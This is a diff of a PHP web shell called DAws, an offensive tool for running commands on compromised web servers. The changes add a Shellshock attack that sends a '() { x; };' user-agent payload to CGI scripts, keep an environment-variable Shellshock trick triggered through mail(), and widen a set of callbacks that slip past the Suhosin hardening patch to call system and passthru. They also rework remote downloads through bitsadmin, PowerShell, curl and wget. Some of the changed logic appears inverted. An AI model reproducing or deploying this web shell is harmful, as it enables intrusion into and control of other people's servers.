@@ -534,18 +534,21 @@ if (!isset($_SESSION["python"]))
 
 function write_to_file($location, $string)
 {
-	if (file_put_contents_extended($location, $string) == False)
+	$output = file_put_contents_extended($location, $string); //file_put_contents
+	if ($output != False)
 	{
-		if (($fp = fopen_extended($location, "w")) != False)
-		{
-			fwrite($fp, $string);
-			fclose($fp);
-		}
-		else
-		{
-			execute_command("echo $string > $location");
-		}
+		return;
 	}
+
+	$fp = fopen_extended($location, "w"); //fopen
+	if ($fp != False)
+	{
+		fwrite($fp, $string);
+		fclose($fp);
+		return;
+	}
+
+	execute_command("echo ".escapeshellarg($string)." > $location"); //system commands
 }
 
 function read_file($location)
@@ -555,32 +558,35 @@ function read_file($location)
 		return "";
 	}
 
-	if (($content = file_get_contents_extended($location)) != False)
+	$content = file_get_contents_extended($location); //file_get_contents
+	if ($content == False)
 	{
 		return htmlspecialchars($content);
 	}
-	else if (($fp = fopen_extended($location, "r")) != False)
+
+	$fp = fopen_extended($location, "r"); //fopen
+	if ($fp != False)
 	{
 		$content = htmlspecialchars(fread($fp, filesize($location)));
 		fclose($fp);
-		return htmlspecialchars($content);
+		return $content;
+	}
+
+	if ($_SESSION["windows"] == True) //system commands
+	{
+		return htmlspecialchars(execute_command("type $location"));
 	}
 	else
 	{
-		if ($_SESSION["windows"] == True)
-		{
-			return htmlspecialchars(execute_command("type $location"));
-		}
-		else
-		{
-			return htmlspecialchars(execute_command("cat $location"));
-		}
+		return htmlspecialchars(execute_command("cat $location"));
 	}
+
+	return "DAws: failed to read the file because file_get_contents_extended, fopen_extended and system commands failed."; //fail
 }
 
-function url_get_contents($url) //used to download the source of a webpage
+function url_get_contents($url, $user_agent=null) //used to download the source of a webpage
 {
-	if ((installed_php("curl_version") == True) && (disabled_php("curl_init") == False))
+	if ((installed_php("curl_version") == True) && (disabled_php("curl_init") == False)) //using curl
 	{
 		if (disabled_suhosin("curl_init") == False)
 		{
@@ -593,52 +599,74 @@ function url_get_contents($url) //used to download the source of a webpage
 
 		curl_setopt($ch, CURLOPT_URL, $url);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+		if ($user_agent != null) //used by shellshock (method 2)
+		{
+			curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+		}
+
 		$content = curl_exec($ch);
 		curl_close($ch);
 
 		return $content;
 	}
-	else if (($content = file_get_contents_extended($url, True)) != False)
+
+	//for file_get_contents and fopen
+	if ($user_agent != null)
+	{
+		$opts = array('http'=>array('header'=>"User-Agent: $user_agent\r\n"));
+		$context = stream_context_create($opts);
+	}
+	else
+	{
+		$context = null;
+	}
+
+	//using file_get_contents
+	$content = file_get_contents_extended($url, True, $context);
+	if ($content != False)
 	{
 		return $content;
 	}
-	else if (($fp = fopen_extended($url, "r", True)) != False)
+
+	//using fopen
+	$fp = fopen_extended($url, "r", True, $context);
+	if ($fp != False)
 	{
-		$content = htmlspecialchars(fread($fp, filesize($url)));
+		$content = fread($fp, filesize($url));
 		fclose($fp);
 		return $content;
 	}
-	else //system commands it is
+
+	//using system commands (no need to apply shellshock here since we're already using system commands...)
+	if ($_SESSION["windows"] == True)
 	{
-		if ($_SESSION["windows"] == True)
+		if (execute_command("bitsadmin", True)  == True) //bitsadmin is a nice choice here
 		{
-			if (execute_command("bitsadmin", True)  == True) //bitsadmin is a nice choice here
-			{
-				execute_command("bitsadmin.exe /Transfer DAwsDownloadJob $link $location");
-			}
-			else if (strpos(execute_command("powershell.exe"), "Windows PowerShell")) //powershell comes next
-			{
-				execute_command("powershell.exe Invoke-WebRequest $link -OutFile $location");
-			}
-			else
-			{
-				return False; //sadly, nothing worked
-			}
+			return execute_command("bitsadmin.exe /Transfer DAwsDownloadJob $link $location > null; type $location");
 		}
-		else //curl or wget for Linux
+		else if (strpos(execute_command("powershell.exe"), "Windows PowerShell")) //powershell comes next
 		{
-			if (execute_command("curl", True) == True)
-			{
-				execute_command("curl $link -o $location");
-			}
-			else if (execute_command("wget", True) == True)
-			{
-				execute_command("wget $link -O $location");
-			}
-			else
-			{
-				return False;
-			}
+			return execute_command("powershell.exe Invoke-WebRequest $link -OutFile $location > null; type $location");
+		}
+		else
+		{
+			return False; //sadly, nothing worked
+		}
+	}
+	else //curl or wget for Linux
+	{
+		if (execute_command("curl", True) == True)
+		{
+			return execute_command("curl $link -o $location 2>&1; cat $location");
+		}
+		else if (execute_command("wget", True) == True)
+		{
+			return execute_command("wget $link -O $location 2>&1; cat $location");
+		}
+		else
+		{
+			return False;
 		}
 	}
 }
@@ -704,19 +732,14 @@ function execute_ssh($command) //ssh
 	}
 }
 
-function shsh($command) //shellshock
+function shsh($command) //shellshock (method 1)
 {
 	$filename = $_SESSION["daws_directory"].rand(1,1000).".data";
 	putenv("PHP_LOL=() { x; }; $command > $filename 2>&1");
 	mail("a@127.0.0.1", "", "", "", "-bv");
 	if (file_exists($filename))
 	{
-		if (($content = file_get_contents_extended($filename)) == False)
-		{
-			$fp = fopen_extended($filename, "r");
-			$content = htmlspecialchars(fread($fp, filesize($filename)));
-			fclose($fp);
-		}
+		$content = read_file($filename);
 		unlink($filename);
 	}
 	else
@@ -725,14 +748,27 @@ function shsh($command) //shellshock
 	}
 
 	return $content;
-} //this was written by Starfall and I know that this will simply fail if sendmail was uninstalled
-// I am working on something that would basically find cgi scripts and try to invoke shellshock based on HTTP Headers.
-//I started working on it months ago and then I stopped but I'll finish it soon, I hope.
-//The point is that this shellshock is a big deal even though it's getting old but adding extra methods that will
-//somehow guarantee its success on a vulnerable system makes DAws stronger.
-//If you have any other methods in mind then hit me up, thanks in advance.
+} //this was written by Starfall and I know that this will simply fail if sendmail wasn't installed
 
-if (!isset($_SESSION["shsh"])) //testing shellshock
+function shsh2($command) //shellshock (method 2)
+{
+	$filename = $_SESSION["daws_directory"].rand(1,1000).".data";
+	url_get_contents($_SESSION["shsh2_cgi_script"], "() { x; }; $command > $filename 2>&1"); //this will be updated later but lets keep it here for now
+
+	if (file_exists($filename))
+	{
+		$content = read_file($filename);
+		unlink($filename);
+	}
+	else
+	{
+		$content = "";
+	}
+
+	return $content;
+} //this will send http requests with a shellshock user agent to a cgi script
+
+if (!isset($_SESSION["shsh"])) //testing shellshock1
 {
 	if ($_SESSION["windows"] == False) //more checks aren't necessary thanks to the upcoming test
 	{
@@ -751,9 +787,140 @@ if (!isset($_SESSION["shsh"])) //testing shellshock
 	}
 }
 
-function bypass_suhosin($function, $arg1=null, $arg2=null, $arg3=null, $output_needed = True) //I found no other way to deal with arguments... poor me.
+if (!isset($_SESSION["shsh2"])) //testing shellshock2
 {
-	if ($arg3 != null)
+	if ($_SESSION["windows"] == False)
+	{
+		if (shsh("echo Dyme and Starfall") == "Dyme and Starfall")
+		{
+			$_SESSION["shsh2"] = True;
+		}
+		else
+		{
+			$_SESSION["shsh2"] = False;
+		}
+	}
+	else
+	{
+		$_SESSION["shsh2"] = False;
+	}
+}
+
+function bypass_suhosin($function, $arg1=null, $arg2=null, $arg3=null, $arg4=null, $arg5=null, $output_needed = True) //I found no other way to deal with arguments... poor me.
+{
+	if ($arg5 != null)
+	{
+		if (disabled_php("call_user_func") == False)
+		{
+			$return_value = call_user_func($function, $arg1, $arg2, $arg3, $arg4, $arg5);
+		}
+		else if (disabled_php("call_user_func_array") == False)
+		{
+			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3, $arg4, $arg5));
+		}
+		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
+		{
+			$ref_function = new ReflectionFunction($function);
+			$handle = $ref_function->invoke($arg1, $arg2, $arg3, $arg4, $arg5);
+			if (is_string($handle))
+			{
+				$return_value = $handle;
+			}
+			else
+			{
+				$return_value = fread($handle, 4096);
+				pclose($handle);
+			}
+		}
+		else if ($output_needed == False)
+		{
+			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
+			{
+				$it = new ArrayIterator(array(""));
+				iterator_apply($it, $function, array($arg1, $arg2, $arg3, $arg4, $arg5));
+			}
+			else if (disabled_php("register_tick_function") == False)
+			{
+				declare(ticks=1);
+				register_tick_function($function, $arg1, $arg2, $arg3, $arg4, $arg5);
+				unregister_tick_function($function);
+			}
+			else if (disabled_php("array_map") == False)
+			{
+				array_map($function, array($arg1, $arg2, $arg3, $arg4, $arg5));
+			}
+			else if (disabled_php("array_walk") == False)
+			{
+				$x = array($arg1, $arg2, $arg3, $arg4, $arg5);
+				array_walk($x, $function);
+			}
+			else if (disabled_php("array_filter") == False)
+			{
+				array_filter(array($arg1, $arg2, $arg3, $arg4, $arg5), $function);
+			}
+			else if (disabled_php("register_shutdown_function"))
+			{
+				register_shutdown_function($function, $arg1, $arg2, $arg3, $arg4, $arg5);
+			}
+		}
+	}
+	else if ($arg4 != null)
+	{
+		if (disabled_php("call_user_func") == False)
+		{
+			$return_value = call_user_func($function, $arg1, $arg2, $arg3, $arg4);
+		}
+		else if (disabled_php("call_user_func_array") == False)
+		{
+			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3, $arg4));
+		}
+		else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False))
+		{
+			$ref_function = new ReflectionFunction($function);
+			$handle = $ref_function->invoke($arg1, $arg2, $arg3, $arg4);
+			if (is_string($handle))
+			{
+				$return_value = $handle;
+			}
+			else
+			{
+				$return_value = fread($handle, 4096);
+				pclose($handle);
+			}
+		}
+		else if ($output_needed == False)
+		{
+			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False))
+			{
+				$it = new ArrayIterator(array(""));
+				iterator_apply($it, $function, array($arg1, $arg2, $arg3, $arg4));
+			}
+			else if (disabled_php("register_tick_function") == False)
+			{
+				declare(ticks=1);
+				register_tick_function($function, $arg1, $arg2, $arg3, $arg4);
+				unregister_tick_function($function);
+			}
+			else if (disabled_php("array_map") == False)
+			{
+				array_map($function, array($arg1, $arg2, $arg3, $arg4));
+			}
+			else if (disabled_php("array_walk") == False)
+			{
+				$x = array($arg1, $arg2, $arg3, $arg4);
+				array_walk($x, $function);
+			}
+			else if (disabled_php("array_filter") == False)
+			{
+				array_filter(array($arg1, $arg2, $arg3, $arg4), $function);
+			}
+			else if (disabled_php("register_shutdown_function"))
+			{
+				register_shutdown_function($function, $arg1, $arg2, $arg3, $arg4);
+			}
+		}
+	}
+	else if ($arg3 != null)
 	{
 		if (disabled_php("call_user_func") == False)
 		{
@@ -1004,7 +1171,7 @@ function execute_command($command, $software_check = False) //this is also used 
 		}
 		else //disabled by Suhosin
 		{
-			bypass_suhosin("system", $command, null, null, False);
+			bypass_suhosin("system", $command, null, null, null, null, False);
 		}
 		$return_value = ob_get_contents();
 		ob_end_clean();
@@ -1018,7 +1185,7 @@ function execute_command($command, $software_check = False) //this is also used 
 		}
 		else
 		{
-			bypass_suhosin("passthru", $command, null, null, False);
+			bypass_suhosin("passthru", $command, null, null, null, null, False);
 		}
 		$return_value = ob_get_contents();
 		ob_end_clean();
@@ -1110,6 +1277,10 @@ function execute_command($command, $software_check = False) //this is also used 
 	{
 		$return_value = shsh($command);
 	}
+	else if ($_SESSION["shsh2"] == True)
+	{
+		$return_value = shsh2($command);
+	}
 	else if ($_SESSION["ssh"] == True)
 	{
 		$return_value = execute_ssh($command);
@@ -1158,7 +1329,7 @@ function execute_script($code, $location, $extension, $output_needed = False)
 	return execute_command($command);
 }
 
-function file_get_contents_extended($filename, $is_url = False) //same thing was done for multiple other functions, the point is to bypass Suhosin using less code Lol
+function file_get_contents_extended($filename, $is_url = False, $context = null) //same thing was done for multiple other functions, the point is to bypass Suhosin using less code Lol
 {
 	if (disabled_php("file_get_contents") == False)
 	{
@@ -1166,11 +1337,11 @@ function file_get_contents_extended($filename, $is_url = False) //same thing was
 		{
 			if (disabled_suhosin("file_get_contents") == False)
 			{
-				return file_get_contents($filename);
+				return file_get_contents($filename, False, $context);
 			}
 			else
 			{
-				return bypass_suhosin("file_get_contents", $filename);
+				return bypass_suhosin("file_get_contents", $filename, False, $context);
 			}
 		}
 	}
@@ -1180,7 +1351,7 @@ function file_get_contents_extended($filename, $is_url = False) //same thing was
 	}
 }
 
-function fopen_extended($filename, $type, $is_url = False)
+function fopen_extended($filename, $type, $is_url=false, $context=null)
 {
 	if (disabled_php("fopen") == False)
 	{
@@ -1188,11 +1359,25 @@ function fopen_extended($filename, $type, $is_url = False)
 		{
 			if (disabled_suhosin("fopen") == False)
 			{
-				return fopen($filename, $type);
+				if ($context != null) //it will cause an error if we don't do that, unlike file_get_contents
+				{
+					return fopen($filename, $type, False, $context);
+				}
+				else
+				{
+					return fopen($filename, $type);
+				}
 			}
 			else
 			{
-				return bypass_suhosin("fopen", $filename, $type);
+				if ($context != null)
+				{
+					return bypass_suhosin("fopen", $filename, $type, False, $context);
+				}
+				else
+				{
+					return bypass_suhosin("fopen", $filename, $type);
+				}
 			}
 		}
 	}
@@ -1212,13 +1397,15 @@ function file_put_contents_extended($file_name, $input)
 		}
 		else
 		{
-			bypass_suhosin("file_put_contents", $file_name, $input, null, False);
+			bypass_suhosin("file_put_contents", $file_name, $input, null, null, null, False);
 		}
 	}
 	else
 	{
 		return False;
 	}
+
+	return True;
 }
 
 function include_php($filename)
@@ -1231,7 +1418,7 @@ function include_php($filename)
 		}
 		else
 		{
-			bypass_suhosin("include", $filename, null, null, False);
+			bypass_suhosin("include", $filename, null, null, null, null, False);
 		}
 		unlink($filename);
 	}
@@ -1243,7 +1430,7 @@ function include_php($filename)
 		}
 		else
 		{
-			bypass_suhosin("include_once", $filename, null, null, False);
+			bypass_suhosin("include_once", $filename, null, null, null, null, False);
 		}
 		unlink($filename);
 	}
@@ -1255,7 +1442,7 @@ function include_php($filename)
 		}
 		else
 		{
-			bypass_suhosin("require", $filename, null, null, False);
+			bypass_suhosin("require", $filename, null, null, null, null, False);
 		}
 		unlink($filename);
 	}
@@ -1267,7 +1454,7 @@ function include_php($filename)
 		}
 		else
 		{
-			bypass_suhosin("require_once", $filename, null, null, False);
+			bypass_suhosin("require_once", $filename, null, null, null, null, False);
 		}
 		unlink($filename);
 	}
